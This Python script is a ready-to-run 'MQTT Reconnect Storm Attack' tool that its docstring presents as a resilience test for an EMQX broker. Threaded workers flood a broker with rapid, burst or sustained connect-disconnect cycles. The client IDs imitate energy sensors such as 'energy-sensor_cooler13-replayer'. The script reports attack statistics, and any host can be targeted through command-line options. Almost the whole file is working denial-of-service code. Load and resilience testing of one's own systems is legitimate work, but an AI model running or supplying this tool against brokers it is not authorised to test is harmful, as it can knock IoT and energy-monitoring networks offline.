#!/usr/bin/env python3
"""
MQTT Reconnect Storm Attack Script (Windows Compatible)
=======================================================
Simulates reconnect storm attacks to test EMQX connection handling and resilience.

Client IDs are generated in the form:
    energy-<device_base><index>-replayer
e.g. energy-sensor_cooler13-replayer

(Username/password/TLS removed for plain 1883 operation.)
"""

import paho.mqtt.client as mqtt
import json
import time
import threading
import random
import argparse
from datetime import datetime, timezone


def make_client_id(device_base: str, index: int,
                   prefix: str = "energy-", suffix: str = "replayer",
                   sep: str = "-") -> str:
    """
    Build client-id like: energy-sensor_cooler13-replayer

    - device_base: e.g. 'sensor_cooler', 'sensor_fanspeed', 'sensor_motion'
    - index: integer appended to device_base (13, 2, 18, ...)
    - prefix: 'energy-' by default
    - suffix: 'replayer' by default
    - sep: separator before the suffix ( '-' by default )
    """
    device = str(device_base).strip().replace(" ", "_")
    idx = int(index)
    return f"{prefix}{device}{idx}{sep}{suffix}"


class ReconnectStormAttack:
    def __init__(self, broker_host="localhost", broker_port=1883):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.attack_stats = {
            "reconnect_attempts": 0,
            "connections_successful": 0,
            "connections_failed": 0,
            "disconnections": 0,
            "messages_sent": 0,
            "start_time": None,
            "end_time": None
        }
        # fallback device types for client-id generation
        self.fallback_device_types = ["sensor_cooler", "sensor_fanspeed", "sensor_motion"]

    def create_client(self, client_id):
        """Create MQTT client (no auth/TLS for port 1883)"""
        try:
            # paho v1.x compatible (no callback_api_version)
            client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)
            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def _get_client_id_for_reconnect(self, worker_id: int, reconnect_index: int):
        """
        Create a readable client id for reconnect scenarios.
        We use a fallback device type based on worker_id and build an index
        from worker_id and reconnect_index to keep ids unique-ish.
        """
        device_base = self.fallback_device_types[worker_id % len(self.fallback_device_types)]
        # create a unique-ish numeric index: pack worker and reconnect into one number
        idx = worker_id * 10000 + (reconnect_index + 1)
        return make_client_id(device_base, idx)

    def reconnect_storm_worker(self, worker_id, num_reconnects=50, min_delay_ms=10, max_delay_ms=100):
        """Worker thread for reconnect storm attack"""
        print(f" Worker {worker_id}: Starting reconnect storm attack...")

        for reconnect in range(num_reconnects):
            try:
                client_id = self._get_client_id_for_reconnect(worker_id, reconnect)
                client = self.create_client(client_id)

                if not client:
                    self.attack_stats["connections_failed"] += 1
                    continue

                # v1.x callback signature
                def on_connect(client_obj, userdata, flags, rc):
                    if rc == 0:
                        self.attack_stats["connections_successful"] += 1
                        if reconnect % 10 == 0:
                            print(f" Worker {worker_id} ({client_id}): Reconnect {reconnect+1} successful")

                        # Send test messages
                        for i in range(3):
                            try:
                                payload = {
                                    "attack_type": "reconnect_storm",
                                    "worker_id": worker_id,
                                    "reconnect_id": reconnect + 1,
                                    "message_id": i,
                                    "timestamp": datetime.now(timezone.utc).isoformat(),
                                    "storm_data": "S" * random.randint(50, 200)
                                }
                                result = client_obj.publish("test/reconnect", json.dumps(payload), qos=0)
                                if getattr(result, "rc", 1) == 0:
                                    self.attack_stats["messages_sent"] += 1
                            except Exception:
                                pass
                        time.sleep(random.uniform(0.1, 0.5))
                    else:
                        self.attack_stats["connections_failed"] += 1
                        if reconnect % 10 == 0:
                            print(f" Worker {worker_id} ({client_id}): Reconnect {reconnect+1} failed: {rc}")

                def on_disconnect(client_obj, userdata, rc):
                    self.attack_stats["disconnections"] += 1

                client.on_connect = on_connect
                client.on_disconnect = on_disconnect

                client.connect(self.broker_host, self.broker_port, 60)
                client.loop_start()

                self.attack_stats["reconnect_attempts"] += 1
                time.sleep(random.uniform(0.1, 0.3))

                client.loop_stop()
                client.disconnect()

                time.sleep(random.uniform(min_delay_ms, max_delay_ms) / 1000.0)

            except Exception as e:
                self.attack_stats["connections_failed"] += 1
                if reconnect % 10 == 0:
                    print(f" Worker {worker_id}: Error in reconnect {reconnect+1}: {e}")

        print(f" Worker {worker_id}: Completed reconnect storm attack")

    def rapid_reconnect_worker(self, worker_id, duration_seconds=30, reconnect_interval_ms=50):
        """Worker thread for rapid reconnect attack"""
        print(f" Worker {worker_id}: Starting rapid reconnect attack...")

        start_time = time.time()
        reconnect_count = 0

        while time.time() - start_time < duration_seconds:
            try:
                client_id = self._get_client_id_for_reconnect(worker_id, reconnect_count)
                client = self.create_client(client_id)

                if not client:
                    self.attack_stats["connections_failed"] += 1
                    reconnect_count += 1
                    continue

                def on_connect(client_obj, userdata, flags, rc):
                    if rc == 0:
                        self.attack_stats["connections_successful"] += 1
                        if reconnect_count % 20 == 0:
                            print(f" Worker {worker_id} ({client_id}): Rapid reconnect {reconnect_count+1} successful")
                    else:
                        self.attack_stats["connections_failed"] += 1

                def on_disconnect(client_obj, userdata, rc):
                    self.attack_stats["disconnections"] += 1

                client.on_connect = on_connect
                client.on_disconnect = on_disconnect

                client.connect(self.broker_host, self.broker_port, 60)
                client.loop_start()

                self.attack_stats["reconnect_attempts"] += 1
                reconnect_count += 1

                time.sleep(0.05)

                client.loop_stop()
                client.disconnect()
                time.sleep(reconnect_interval_ms / 1000.0)

            except Exception as e:
                self.attack_stats["connections_failed"] += 1
                if reconnect_count % 20 == 0:
                    print(f" Worker {worker_id}: Error in rapid reconnect {reconnect_count+1}: {e}")
                reconnect_count += 1

        print(f" Worker {worker_id}: Completed rapid reconnect attack")

    def burst_reconnect_worker(self, worker_id, burst_size=20, burst_interval_ms=1000, num_bursts=10):
        """Worker thread for burst reconnect attack"""
        print(f" Worker {worker_id}: Starting burst reconnect attack...")

        for burst in range(num_bursts):
            print(f" Worker {worker_id}: Starting burst {burst+1}/{num_bursts}")
            clients = []
            for i in range(burst_size):
                try:
                    # use burst index to create many unique ids within this burst
                    reconnect_index = burst * burst_size + i
                    client_id = self._get_client_id_for_reconnect(worker_id, reconnect_index)
                    client = self.create_client(client_id)
                    if client:
                        clients.append((client_id, client))
                except Exception:
                    self.attack_stats["connections_failed"] += 1

            # connect all clients in the burst
            for client_id, client in clients:
                try:
                    def on_connect(client_obj, userdata, flags, rc):
                        if rc == 0:
                            self.attack_stats["connections_successful"] += 1
                        else:
                            self.attack_stats["connections_failed"] += 1

                    def on_disconnect(client_obj, userdata, rc):
                        self.attack_stats["disconnections"] += 1

                    client.on_connect = on_connect
                    client.on_disconnect = on_disconnect

                    client.connect(self.broker_host, self.broker_port, 60)
                    client.loop_start()
                    self.attack_stats["reconnect_attempts"] += 1
                except Exception:
                    self.attack_stats["connections_failed"] += 1

            # short pause while clients are connected
            time.sleep(0.2)

            # disconnect all clients
            for client_id, client in clients:
                try:
                    client.loop_stop()
                    client.disconnect()
                except Exception:
                    pass

            if burst < num_bursts - 1:
                time.sleep(burst_interval_ms / 1000.0)

        print(f" Worker {worker_id}: Completed burst reconnect attack")

    def launch_attack(self, attack_type="storm", num_workers=3, num_reconnects=50,
                     min_delay_ms=10, max_delay_ms=100, duration_seconds=30,
                     reconnect_interval_ms=50, burst_size=20, burst_interval_ms=1000, num_bursts=10):
        """Launch reconnect storm attack"""
        print(f" Starting Reconnect Storm Attack")
        print(f"   Attack type: {attack_type}")
        print(f"   Workers: {num_workers}")
        print(f"   Reconnects per worker: {num_reconnects}")
        print(f"   Delay range: {min_delay_ms}-{max_delay_ms}ms")
        print("=" * 60)

        self.attack_stats["start_time"] = time.time()
        threads = []

        if attack_type == "rapid":
            for i in range(num_workers):
                threads.append(threading.Thread(
                    target=self.rapid_reconnect_worker,
                    args=(i, duration_seconds, reconnect_interval_ms)
                ))
        elif attack_type == "burst":
            for i in range(num_workers):
                threads.append(threading.Thread(
                    target=self.burst_reconnect_worker,
                    args=(i, burst_size, burst_interval_ms, num_bursts)
                ))
        else:
            for i in range(num_workers):
                threads.append(threading.Thread(
                    target=self.reconnect_storm_worker,
                    args=(i, num_reconnects, min_delay_ms, max_delay_ms)
                ))

        for t in threads:
            t.start()

        try:
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")

        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()

    def print_attack_stats(self):
        """Print attack statistics"""
        duration = (self.attack_stats["end_time"] - self.attack_stats["start_time"]) if self.attack_stats["end_time"] and self.attack_stats["start_time"] else 0
        print("\n Attack Statistics:")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Reconnect attempts: {self.attack_stats['reconnect_attempts']}")
        print(f"Connections successful: {self.attack_stats['connections_successful']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        print(f"Disconnections: {self.attack_stats['disconnections']}")
        print(f"Messages sent: {self.attack_stats['messages_sent']}")

        if self.attack_stats['reconnect_attempts'] > 0:
            rate = (self.attack_stats['connections_successful'] /
                    self.attack_stats['reconnect_attempts'] * 100)
            print(f"Connection success rate: {rate:.1f}%")
        if duration > 0:
            print(f"Reconnects per second: {self.attack_stats['reconnect_attempts']/duration:.1f}")


def main():
    parser = argparse.ArgumentParser(description="MQTT Reconnect Storm Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--type", choices=["storm", "rapid", "burst"], default="storm", help="Attack type")
    parser.add_argument("--workers", type=int, default=3, help="Number of worker threads")
    parser.add_argument("--reconnects", type=int, default=50, help="Reconnects per worker")
    parser.add_argument("--min-delay", type=int, default=10, help="Minimum delay (ms)")
    parser.add_argument("--max-delay", type=int, default=100, help="Maximum delay (ms)")
    parser.add_argument("--duration", type=int, default=30, help="Duration for rapid attack (s)")
    parser.add_argument("--interval", type=int, default=50, help="Interval for rapid attack (ms)")
    parser.add_argument("--burst-size", type=int, default=20, help="Burst size")
    parser.add_argument("--burst-interval", type=int, default=1000, help="Interval between bursts (ms)")
    parser.add_argument("--num-bursts", type=int, default=10, help="Number of bursts")

    args = parser.parse_args()

    attack = ReconnectStormAttack(
        broker_host=args.broker,
        broker_port=args.port
    )

    attack.launch_attack(
        attack_type=args.type,
        num_workers=args.workers,
        num_reconnects=args.reconnects,
        min_delay_ms=args.min_delay,
        max_delay_ms=args.max_delay,
        duration_seconds=args.duration,
        reconnect_interval_ms=args.interval,
        burst_size=args.burst_size,
        burst_interval_ms=args.burst_interval,
        num_bursts=args.num_bursts
    )


if __name__ == "__main__":
    main()
